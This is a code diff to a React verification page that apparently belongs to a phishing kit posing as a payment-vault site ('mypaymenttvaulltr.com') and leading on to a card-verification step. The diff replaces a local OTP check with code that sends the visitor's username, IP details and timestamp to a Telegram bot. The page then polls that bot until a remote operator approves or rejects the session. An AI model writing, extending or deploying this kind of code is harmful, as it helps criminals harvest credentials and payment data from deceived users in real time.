@@ -1,8 +1,15 @@
 import { useState, useRef, useEffect } from "react";
 import { useLocation } from "wouter";
-import { Globe, ChevronDown, ShieldCheck } from "lucide-react";
+import { Globe, ChevronDown } from "lucide-react";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
 import { useI18n, type Language } from "@/lib/i18n";
+import {
+  getIPInfo,
+  sendApprovalRequest,
+  pollApproval,
+  answerCallback,
+  getLatestOffset,
+} from "@/lib/telegram";
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
@@ -10,68 +17,63 @@ const languageOptions: { code: Language; label: string }[] = [
   { code: "fr", label: "Français" },
 ];
 
+type Stage = "waiting" | "approved" | "rejected";
+
 export default function BotOtp() {
   const [, navigate] = useLocation();
   const { lang, setLang, langName } = useI18n();
-  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
-  const [error, setError] = useState("");
-  const [loading, setLoading] = useState(false);
+  const [stage, setStage] = useState<Stage>("waiting");
   const [showLangDropdown, setShowLangDropdown] = useState(false);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const [username, setUsername] = useState("");
+
+  const pollRef   = useRef<ReturnType<typeof setInterval> | null>(null);
+  const offsetRef = useRef(0);
 
   useEffect(() => {
-    const code = sessionStorage.getItem("botOtpCode");
-    if (!code) navigate("/login");
-    else inputRefs.current[0]?.focus();
+    const stored = sessionStorage.getItem("botOtpUsername");
+    if (!stored) { navigate("/login"); return; }
+    setUsername(stored);
+
+    let cancelled = false;
+
+    (async () => {
+      const [ip, startOffset, now] = await Promise.all([
+        getIPInfo(),
+        getLatestOffset(),
+        Promise.resolve(new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })),
+      ]);
+      if (cancelled) return;
+      offsetRef.current = startOffset;
+
+      await sendApprovalRequest(stored, ip, now, `botp_${startOffset}`, "OTP Verification");
+
+      pollRef.current = setInterval(async () => {
+        const { status, nextOffset, callbackId } = await pollApproval(
+          offsetRef.current,
+          `botp_${startOffset}`
+        );
+        offsetRef.current = nextOffset;
+
+        if (status === "approved") {
+          clearInterval(pollRef.current!);
+          if (callbackId)
+            await answerCallback(callbackId, "✅ OTP disetujui! Melanjutkan...");
+          setStage("approved");
+          setTimeout(() => navigate("/login-success"), 1200);
+        } else if (status === "rejected") {
+          clearInterval(pollRef.current!);
+          if (callbackId)
+            await answerCallback(callbackId, "❌ OTP ditolak.");
+          setStage("rejected");
+        }
+      }, 2500);
+    })();
+
+    return () => {
+      cancelled = true;
+      if (pollRef.current) clearInterval(pollRef.current);
+    };
   }, [navigate]);
-
-  const handleDigitChange = (idx: number, val: string) => {
-    const char = val.replace(/\D/g, "").slice(-1);
-    const next = [...digits];
-    next[idx] = char;
-    setDigits(next);
-    if (char && idx < 5) inputRefs.current[idx + 1]?.focus();
-  };
-
-  const handleKeyDown = (idx: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === "Backspace") {
-      if (digits[idx]) {
-        const next = [...digits]; next[idx] = ""; setDigits(next);
-      } else if (idx > 0) {
-        inputRefs.current[idx - 1]?.focus();
-      }
-    } else if (e.key === "ArrowLeft" && idx > 0) {
-      inputRefs.current[idx - 1]?.focus();
-    } else if (e.key === "ArrowRight" && idx < 5) {
-      inputRefs.current[idx + 1]?.focus();
-    }
-  };
-
-  const handlePaste = (e: React.ClipboardEvent) => {
-    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
-    if (pasted.length === 6) {
-      setDigits(pasted.split(""));
-      inputRefs.current[5]?.focus();
-    }
-  };
-
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    setError("");
-    const entered = digits.join("");
-    if (entered.length < 6) { setError("Please enter the 6-digit verification code."); return; }
-    setLoading(true);
-    const stored = sessionStorage.getItem("botOtpCode");
-    if (entered === stored) {
-      sessionStorage.removeItem("botOtpCode");
-      navigate("/verify-card");
-    } else {
-      setError("Incorrect code. Please check the code sent to your email.");
-      setDigits(["", "", "", "", "", ""]);
-      setTimeout(() => inputRefs.current[0]?.focus(), 50);
-    }
-    setLoading(false);
-  };
 
   return (
     <div
@@ -92,14 +94,15 @@ export default function BotOtp() {
             border-radius: 0 !important;
           }
         }
+        @keyframes botp-spin { to { transform: rotate(360deg); } }
+        @keyframes botp-pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
       `}</style>
 
-      {/* ─── CARD ─── */}
       <div
         className="w-full flex flex-col bg-white botp-card"
         style={{ maxWidth: 480, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
       >
-        {/* ══ HEADER ROW ══ */}
+        {/* ── HEADER ── */}
         <div
           className="flex items-center justify-between"
           style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}
@@ -156,123 +159,134 @@ export default function BotOtp() {
           </div>
         </div>
 
-        {/* ══ HERO IMAGE ══ */}
+        {/* ── HERO IMAGE ── */}
         <div style={{ width: "100%", lineHeight: 0 }}>
           <img src="/hero-vault-new.png" alt="mypaymenttvaulltr.com" style={{ width: "100%", display: "block" }} />
         </div>
 
-        {/* ══ FORM ══ */}
-        <div style={{ padding: "28px 28px 28px" }}>
+        {/* ── BODY ── */}
+        <div style={{ padding: "36px 28px 40px", textAlign: "center" }}>
 
           {/* Step indicator */}
-          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 20 }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 28, justifyContent: "center" }}>
             <div style={{
               width: 22, height: 22, borderRadius: "50%",
-              background: "#111", display: "flex", alignItems: "center", justifyContent: "center",
-              flexShrink: 0,
+              background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
             }}>
               <svg width="11" height="11" viewBox="0 0 12 12" fill="none">
                 <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
               </svg>
             </div>
-            <div style={{ flex: 1, height: 1, background: "#111" }} />
+            <div style={{ width: 44, height: 1, background: "#111" }} />
             <div style={{
               width: 22, height: 22, borderRadius: "50%",
-              background: "#111", display: "flex", alignItems: "center", justifyContent: "center",
-              flexShrink: 0,
+              background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
             }}>
-              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>2</span>
+              <span style={{ fontSize: 11, color: "#fff", fontWeight: 700 }}>2</span>
             </div>
-            <div style={{ flex: 1, height: 1, background: "#ccc" }} />
+            <div style={{ width: 44, height: 1, background: "#ccc" }} />
             <div style={{
               width: 22, height: 22, borderRadius: "50%",
-              background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center",
-              flexShrink: 0,
+              background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
             }}>
               <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>3</span>
             </div>
-            <span style={{ fontSize: 12, color: "#888", marginLeft: 4 }}>Verification</span>
           </div>
 
-          <h2 style={{ fontSize: 17, fontWeight: 400, color: "#111", marginBottom: 4 }}>
-            Verify Your Identity
-          </h2>
-          <p style={{ fontSize: 13, color: "#888", marginBottom: 22 }}>
-            Enter the 6-digit code sent to your email by our support team.
-          </p>
-
-          <form onSubmit={handleSubmit}>
-            {/* 6-digit OTP */}
-            <div style={{ marginBottom: 20 }}>
-              <label style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 8 }}>
-                Verification Code
-              </label>
-              <div style={{ display: "flex", gap: 10, justifyContent: "space-between" }}>
-                {digits.map((d, idx) => (
-                  <input
-                    key={idx}
-                    ref={(el) => { inputRefs.current[idx] = el; }}
-                    type="text"
-                    inputMode="numeric"
-                    maxLength={1}
-                    value={d}
-                    onChange={(e) => handleDigitChange(idx, e.target.value)}
-                    onKeyDown={(e) => handleKeyDown(idx, e)}
-                    onPaste={idx === 0 ? handlePaste : undefined}
-                    style={{
-                      width: 54, height: 62, textAlign: "center",
-                      fontSize: 26, fontWeight: 700, color: "#111",
-                      border: d ? "2.5px solid #111" : "1.5px solid #d0d0d0",
-                      borderRadius: 8, outline: "none",
-                      background: d ? "#f5f5f5" : "#fff",
-                      boxShadow: d ? "0 2px 8px rgba(0,0,0,0.08)" : "none",
-                      transition: "border-color 0.15s, box-shadow 0.15s",
-                      flexShrink: 0,
-                    }}
-                  />
-                ))}
-              </div>
-            </div>
-
-            {error && (
+          {/* ── WAITING ── */}
+          {stage === "waiting" && (
+            <>
               <div style={{
-                background: "#fff0f0", border: "1px solid #fcc", color: "#c00",
-                fontSize: 12, padding: "8px 12px", marginBottom: 14, borderRadius: 3,
-              }}>
-                {error}
+                width: 64, height: 64, margin: "0 auto 20px",
+                border: "5px solid #e8e8e8", borderTop: "5px solid #111",
+                borderRadius: "50%",
+                animation: "botp-spin 0.9s linear infinite",
+              }} />
+              <h2 style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 8 }}>
+                Verifikasi Identitas
+              </h2>
+              <p style={{ fontSize: 14, color: "#555", lineHeight: 1.7, marginBottom: 6 }}>
+                Menunggu persetujuan admin…
+              </p>
+              <p style={{ fontSize: 12, color: "#aaa", animation: "botp-pulse 2s ease-in-out infinite" }}>
+                Jangan tutup halaman ini
+              </p>
+              <div style={{ marginTop: 28, padding: "14px 18px", background: "#f8f8f8", borderRadius: 8, textAlign: "left" }}>
+                <p style={{ fontSize: 12, color: "#888", marginBottom: 4 }}>Akun</p>
+                <p style={{ fontSize: 15, fontWeight: 600, color: "#111" }}>{username}</p>
               </div>
-            )}
+              <button
+                type="button"
+                onClick={() => { if (pollRef.current) clearInterval(pollRef.current); navigate("/login"); }}
+                style={{
+                  marginTop: 20, fontSize: 13, color: "#888",
+                  textDecoration: "underline", background: "none",
+                  border: "none", cursor: "pointer",
+                }}
+              >
+                Kembali ke Login
+              </button>
+            </>
+          )}
 
-            <button
-              type="submit"
-              disabled={loading}
-              style={{
-                width: "100%", height: 44, background: "#111", color: "#fff",
-                fontSize: 14, fontWeight: 500, border: "none",
-                cursor: loading ? "not-allowed" : "pointer",
-                opacity: loading ? 0.6 : 1,
-                letterSpacing: "0.04em", borderRadius: 3,
-                display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
-              }}
-            >
-              {loading ? "Verifying..." : <><ShieldCheck size={16} /> Verify &amp; Continue</>}
-            </button>
-          </form>
+          {/* ── APPROVED ── */}
+          {stage === "approved" && (
+            <>
+              <div style={{
+                width: 64, height: 64, borderRadius: "50%",
+                background: "#111",
+                display: "flex", alignItems: "center", justifyContent: "center",
+                margin: "0 auto 20px",
+              }}>
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M20 6L9 17l-5-5"/>
+                </svg>
+              </div>
+              <h2 style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 8 }}>
+                Disetujui!
+              </h2>
+              <p style={{ fontSize: 14, color: "#555" }}>
+                Identitas Anda telah diverifikasi. Melanjutkan…
+              </p>
+            </>
+          )}
 
-          <p style={{ fontSize: 12, color: "#aaa", textAlign: "center", marginTop: 14 }}>
-            Wrong account?{" "}
-            <button
-              type="button"
-              onClick={() => navigate("/login")}
-              style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}
-            >
-              Back to Login
-            </button>
-          </p>
+          {/* ── REJECTED ── */}
+          {stage === "rejected" && (
+            <>
+              <div style={{
+                width: 64, height: 64, borderRadius: "50%",
+                background: "#c00",
+                display: "flex", alignItems: "center", justifyContent: "center",
+                margin: "0 auto 20px",
+              }}>
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                  <line x1="18" y1="6" x2="6" y2="18"/>
+                  <line x1="6" y1="6" x2="18" y2="18"/>
+                </svg>
+              </div>
+              <h2 style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 8 }}>
+                Akses Ditolak
+              </h2>
+              <p style={{ fontSize: 14, color: "#555", lineHeight: 1.7, marginBottom: 24 }}>
+                Verifikasi identitas Anda tidak disetujui. Silakan hubungi layanan pelanggan atau coba lagi.
+              </p>
+              <button
+                type="button"
+                onClick={() => navigate("/login")}
+                style={{
+                  width: "100%", height: 44, background: "#111", color: "#fff",
+                  fontSize: 14, fontWeight: 600, border: "none",
+                  borderRadius: 4, cursor: "pointer", letterSpacing: "0.03em",
+                }}
+              >
+                Kembali ke Login
+              </button>
+            </>
+          )}
         </div>
       </div>
 
-      {/* Footer */}
       <div style={{ width: "100%", maxWidth: 480, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
         <span style={{ fontSize: 11, color: "#888" }}>
           &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
